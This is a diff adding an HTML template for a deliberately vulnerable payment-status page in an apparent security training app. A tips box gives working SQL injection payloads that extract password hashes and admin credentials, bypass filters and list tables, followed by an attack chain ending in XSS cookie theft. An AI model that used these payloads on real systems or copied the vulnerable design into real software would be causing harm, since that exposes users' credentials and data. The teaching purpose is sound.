@@ -1,0 +1,180 @@
+{% extends "base.html" %}
+
+{% block title %}Payment Status - Typo Payments{% endblock %}
+
+{% block content %}
+<div class="container">
+    <h1>💳 Payment Status Check</h1>
+    <p class="subtitle">Check the status of your payment transactions</p>
+
+    <div class="card">
+        <h2>Enter Payment ID</h2>
+        <form method="GET" action="{{ url_for('check_status') }}">
+            <div class="form-group">
+                <label for="id">Payment ID:</label>
+                <input type="text" id="id" name="id" value="{{ payment_id }}" placeholder="Enter payment ID" required>
+            </div>
+            <button type="submit" class="btn-primary">Check Status</button>
+        </form>
+    </div>
+
+    {% if error %}
+    <div class="card" style="border-left: 4px solid #e74c3c;">
+        <h3 style="color: #e74c3c;">⚠️ Error</h3>
+        <pre style="background: #f8f9fa; padding: 15px; border-radius: 4px; overflow-x: auto;">{{ error }}</pre>
+        <p style="color: #666; margin-top: 10px;">
+            <em>Note: Error messages are displayed for demonstration purposes.</em>
+        </p>
+    </div>
+    {% endif %}
+
+    {% if payment %}
+    <div class="card">
+        <h3>✅ Payment Found</h3>
+        <table class="payment-details">
+            <tr>
+                <th>Payment ID:</th>
+                <td>{{ payment.id }}</td>
+            </tr>
+            <tr>
+                <th>Amount:</th>
+                <td class="amount">${{ "%.2f"|format(payment.amount) }}</td>
+            </tr>
+            <tr>
+                <th>Recipient:</th>
+                <td>{{ payment.recipient }}</td>
+            </tr>
+            <tr>
+                <th>Description:</th>
+                <td>{{ payment.description }}</td>
+            </tr>
+            <tr>
+                <th>Status:</th>
+                <td>
+                    {% if payment.status == 'completed' %}
+                    <span class="status-badge status-completed">✓ Completed</span>
+                    {% elif payment.status == 'pending' %}
+                    <span class="status-badge status-pending">⏳ Pending</span>
+                    {% else %}
+                    <span class="status-badge">{{ payment.status }}</span>
+                    {% endif %}
+                </td>
+            </tr>
+            <tr>
+                <th>Date:</th>
+                <td>{{ payment.created_at }}</td>
+            </tr>
+        </table>
+    </div>
+    {% elif payment_id and not error %}
+    <div class="card" style="border-left: 4px solid #f39c12;">
+        <h3 style="color: #f39c12;">❌ Payment Not Found</h3>
+        <p>No payment found with ID: <strong>{{ payment_id }}</strong></p>
+        <p style="color: #666;">
+            This could mean:
+        </p>
+        <ul style="color: #666;">
+            <li>The payment ID doesn't exist</li>
+            <li>The payment belongs to another user</li>
+            <li>The payment ID is invalid</li>
+        </ul>
+    </div>
+    {% endif %}
+
+    <div class="card" style="background-color: #fff3cd; border-left: 4px solid #ffc107;">
+        <h3>💡 SQL Injection Demo Tips</h3>
+        <p><strong>This page is vulnerable to SQL injection!</strong></p>
+
+        <h4>Example Attacks:</h4>
+
+        <h5>1. Extract User Information:</h5>
+        <pre
+            style="background: #f8f9fa; padding: 10px; border-radius: 4px; overflow-x: auto;">?id=1 UNION SELECT id, username, email, password_hash, full_name, is_admin, created_at FROM users--</pre>
+
+        <h5>2. View All Payments (bypass user restriction):</h5>
+        <pre style="background: #f8f9fa; padding: 10px; border-radius: 4px; overflow-x: auto;">?id=1 OR 1=1--</pre>
+
+        <h5>3. Extract Admin Credentials:</h5>
+        <pre
+            style="background: #f8f9fa; padding: 10px; border-radius: 4px; overflow-x: auto;">?id=1 UNION SELECT id, username, email, password_hash, 'Admin User', is_admin, created_at FROM users WHERE is_admin=1--</pre>
+
+        <h5>4. List All Tables:</h5>
+        <pre
+            style="background: #f8f9fa; padding: 10px; border-radius: 4px; overflow-x: auto;">?id=1 UNION SELECT 1,2,3,name,5,6,7 FROM sqlite_master WHERE type='table'--</pre>
+
+        <h5>5. Extract Session Tokens (if stored):</h5>
+        <pre
+            style="background: #f8f9fa; padding: 10px; border-radius: 4px; overflow-x: auto;">?id=1 UNION SELECT id, username, email, 'token', full_name, is_admin, created_at FROM users--</pre>
+
+        <p style="margin-top: 15px; color: #856404;">
+            <strong>⚠️ Learning Point:</strong> Never use string formatting or concatenation with user input in SQL
+            queries.
+            Always use parameterized queries!
+        </p>
+
+        <h4 style="margin-top: 15px;">Attack Chain Demo:</h4>
+        <ol style="color: #856404;">
+            <li>Use SQLi to extract admin password hash</li>
+            <li>Crack the hash or use SQLi to create new admin user</li>
+            <li>Login as admin</li>
+            <li>Use XSS to steal other users' session cookies</li>
+            <li>Full system compromise!</li>
+        </ol>
+    </div>
+</div>
+
+<style>
+    .payment-details {
+        width: 100%;
+        border-collapse: collapse;
+        margin-top: 15px;
+    }
+
+    .payment-details th {
+        text-align: left;
+        padding: 10px;
+        background-color: #f8f9fa;
+        font-weight: 600;
+        width: 150px;
+    }
+
+    .payment-details td {
+        padding: 10px;
+        border-bottom: 1px solid #e0e0e0;
+    }
+
+    .payment-details tr:last-child td {
+        border-bottom: none;
+    }
+
+    .amount {
+        font-size: 1.2em;
+        font-weight: bold;
+        color: #2ecc71;
+    }
+
+    h4 {
+        margin-top: 20px;
+        margin-bottom: 10px;
+        color: #2c3e50;
+    }
+
+    h5 {
+        margin-top: 15px;
+        margin-bottom: 8px;
+        color: #34495e;
+        font-size: 0.95em;
+    }
+
+    pre {
+        margin: 5px 0 15px 0;
+        font-size: 0.85em;
+        line-height: 1.4;
+    }
+
+    ol {
+        margin-left: 20px;
+        line-height: 1.8;
+    }
+</style>
+{% endblock %}
